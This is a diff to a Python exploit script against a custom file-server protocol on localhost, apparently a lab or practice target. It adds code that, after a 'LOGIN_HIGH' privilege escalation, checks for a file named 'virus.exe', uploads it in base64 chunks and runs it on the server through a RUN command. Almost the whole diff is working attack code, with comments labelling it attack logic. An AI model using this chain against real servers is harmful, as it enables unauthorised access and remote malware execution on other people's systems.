@@ -2,6 +2,8 @@ import socket
 import json
 import struct
 import ctypes
+import base64
+import os
 from ctypes import wintypes
 
 TARGET_IP = "127.0.0.1"
@@ -64,6 +66,177 @@ def discard_banner(sock):
     except (socket.timeout, OSError):
         pass
 
+def parse_response(resp_bytes):
+    """Parse JSON response from server"""
+    if not resp_bytes:
+        return None
+    try:
+        return json.loads(resp_bytes.decode('utf-8'))
+    except:
+        return None
+
+def check_file_exists(sock, filename):
+    """Check if file exists on server using LIST_FILES command"""
+    print(f"[*] Checking if {filename} exists on server...")
+    
+    list_req = build_cmd("LIST_FILES", {})
+    send_frame(sock, list_req)
+    
+    list_resp_bytes = try_recv_frame(sock)
+    if not list_resp_bytes:
+        print("[-] LIST_FILES: No response")
+        return False
+    
+    list_resp = parse_response(list_resp_bytes)
+    if not list_resp or not list_resp.get("ok"):
+        print(f"[-] LIST_FILES failed: {list_resp.get('msg', 'unknown error') if list_resp else 'parse error'}")
+        return False
+    
+    # Get files array from response
+    files_data = list_resp.get("data", {}).get("files", [])
+    if not isinstance(files_data, list):
+        return False
+    
+    # Check if filename is in the list
+    for file_item in files_data:
+        if isinstance(file_item, str) and file_item == filename:
+            print(f"[+] File {filename} exists on server")
+            return True
+        elif isinstance(file_item, dict) and file_item.get("name") == filename:
+            print(f"[+] File {filename} exists on server")
+            return True
+    
+    print(f"[-] File {filename} not found on server")
+    return False
+
+def upload_file(sock, local_path, remote_name):
+    """Upload file to server using UPLOAD_INIT -> UPLOAD_CHUNK -> UPLOAD_FINISH"""
+    print(f"[*] Uploading {local_path} as {remote_name}...")
+    
+    # Check if file exists
+    if not os.path.exists(local_path):
+        print(f"[-] File not found: {local_path}")
+        return False
+    
+    # Read file
+    try:
+        with open(local_path, 'rb') as f:
+            file_data = f.read()
+        file_size = len(file_data)
+        print(f"[+] File size: {file_size} bytes")
+    except Exception as e:
+        print(f"[-] Failed to read file: {e}")
+        return False
+    
+    # Step 1: UPLOAD_INIT
+    default_chunk = 64 * 1024  # 64KB
+    init_req = build_cmd("UPLOAD_INIT", {
+        "filename": remote_name,
+        "file_size": file_size,
+        "chunk_size": default_chunk
+    })
+    send_frame(sock, init_req)
+    init_resp_bytes = try_recv_frame(sock)
+    if not init_resp_bytes:
+        print("[-] UPLOAD_INIT: No response")
+        return False
+    
+    init_resp = parse_response(init_resp_bytes)
+    if not init_resp or not init_resp.get("ok"):
+        print(f"[-] UPLOAD_INIT failed: {init_resp.get('msg', 'unknown error') if init_resp else 'parse error'}")
+        return False
+    
+    upload_id = init_resp.get("data", {}).get("upload_id")
+    chunk_size = init_resp.get("data", {}).get("chunk_size", default_chunk)
+    next_index = init_resp.get("data", {}).get("next_index", 0)
+    
+    if not upload_id:
+        print("[-] UPLOAD_INIT: Missing upload_id")
+        return False
+    
+    print(f"[+] Upload session: id={upload_id}, chunk_size={chunk_size}, next_index={next_index}")
+    
+    # Step 2: UPLOAD_CHUNK (send file in chunks)
+    chunk_index = next_index
+    offset = 0
+    
+    while offset < file_size:
+        chunk_data = file_data[offset:offset + chunk_size]
+        if not chunk_data:
+            break
+        
+        # Encode chunk to base64
+        data_b64 = base64.b64encode(chunk_data).decode('utf-8')
+        
+        chunk_req = build_cmd("UPLOAD_CHUNK", {
+            "upload_id": upload_id,
+            "chunk_index": chunk_index,
+            "data_b64": data_b64
+        })
+        send_frame(sock, chunk_req)
+        
+        chunk_resp_bytes = try_recv_frame(sock)
+        if not chunk_resp_bytes:
+            print(f"[-] UPLOAD_CHUNK[{chunk_index}]: No response")
+            return False
+        
+        chunk_resp = parse_response(chunk_resp_bytes)
+        if not chunk_resp or not chunk_resp.get("ok"):
+            print(f"[-] UPLOAD_CHUNK[{chunk_index}] failed: {chunk_resp.get('msg', 'unknown error') if chunk_resp else 'parse error'}")
+            return False
+        
+        received = chunk_resp.get("data", {}).get("received", 0)
+        print(f"[+] Chunk {chunk_index} uploaded, total received: {received} bytes")
+        
+        offset += len(chunk_data)
+        chunk_index += 1
+    
+    # Step 3: UPLOAD_FINISH
+    finish_req = build_cmd("UPLOAD_FINISH", {
+        "upload_id": upload_id
+    })
+    send_frame(sock, finish_req)
+    finish_resp_bytes = try_recv_frame(sock)
+    if not finish_resp_bytes:
+        print("[-] UPLOAD_FINISH: No response")
+        return False
+    
+    finish_resp = parse_response(finish_resp_bytes)
+    if not finish_resp or not finish_resp.get("ok"):
+        print(f"[-] UPLOAD_FINISH failed: {finish_resp.get('msg', 'unknown error') if finish_resp else 'parse error'}")
+        return False
+    
+    final_filename = finish_resp.get("data", {}).get("filename", remote_name)
+    final_size = finish_resp.get("data", {}).get("size", file_size)
+    print(f"[+] Upload completed: {final_filename} ({final_size} bytes)")
+    return True
+
+def run_command(sock, cmd):
+    """Run command on server using RUN command"""
+    print(f"[*] Running command: {cmd}")
+    
+    run_req = build_cmd("RUN", {
+        "cmd": cmd
+    })
+    send_frame(sock, run_req)
+    
+    run_resp_bytes = try_recv_frame(sock)
+    if not run_resp_bytes:
+        print("[-] RUN: No response")
+        return False
+    
+    run_resp = parse_response(run_resp_bytes)
+    if not run_resp:
+        print("[-] RUN: Failed to parse response")
+        return False
+    
+    if run_resp.get("ok"):
+        print(f"[+] Command executed successfully: {run_resp.get('msg', 'OK')}")
+        return True
+    else:
+        print(f"[-] Command execution failed: {run_resp.get('msg', 'unknown error')}")
+        return False
+
 # --- 攻击逻辑 ---
 
 def debug_exploit():
@@ -114,8 +287,33 @@ def debug_exploit():
 
         # 第三步：验证结果
         if resp_high:
-            print("[*] LOGIN_HIGH response received.")
-            show_local_success_dialog()
+            resp_high_json = parse_response(resp_high)
+            if resp_high_json and resp_high_json.get("ok"):
+                print("[*] LOGIN_HIGH succeeded! Admin privileges obtained.")
+                show_local_success_dialog()
+                
+                # 第四步：检查文件是否存在，如果不存在则上传
+                print("[*] Step 3: Checking if virus.exe exists on server...")
+                virus_filename = "virus.exe"
+                virus_path = os.path.join(os.path.dirname(__file__), "virus.exe")
+                
+                if check_file_exists(sock, virus_filename):
+                    # 文件已存在，直接运行
+                    print("[*] File already exists, skipping upload")
+                else:
+                    # 文件不存在，需要上传
+                    print("[*] Step 3: Uploading virus.exe...")
+                    if not upload_file(sock, virus_path, virus_filename):
+                        print("[-] Upload failed, skipping run command")
+                        sock.close()
+                        return
+                
+                # 第五步：运行 virus.exe
+                print("[*] Step 4: Running virus.exe...")
+                # 文件存储在服务器的 storage_dir（默认 server_files）
+                run_command(sock, "server_files\\virus.exe")
+            else:
+                print("[*] LOGIN_HIGH response received but may have failed.")
         else:
             print("[-] No response from server.")
 
